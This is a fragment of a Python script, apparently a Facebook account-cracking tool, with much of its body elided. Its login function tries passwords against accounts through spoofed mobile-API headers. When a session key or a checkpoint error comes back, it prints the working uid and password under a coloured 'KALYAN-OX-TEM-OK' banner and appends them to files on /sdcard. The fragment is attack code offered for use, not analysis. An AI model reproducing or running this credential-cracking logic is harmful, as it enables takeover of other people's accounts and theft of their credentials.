...
def login(uid):
    ...
    try:
        sys.stdout.write(f'\r\x1b[38;5;196m[\x1b[38;5;48mTIGERS-OLD\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\033[1;37m{loop}\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK•{len(oks)}\x1b[38;5;196m]')
        sys.stdout.flush()
    ...
    "x-fb-net-hni": str(random.randint(30000, 40000)), 
            ...
            if "session_key" in rp:
                print(f"\r\r\033[1;30m[\033[1;33mKALYAN-OX-TEM-OK\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
                open("/sdcard/OLD-OX-TEM-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r\033[1;30m[\033[1;33mKALYAN-OX-TEM-OK\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
                open("/sdcard/OLD-OX-TEM-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
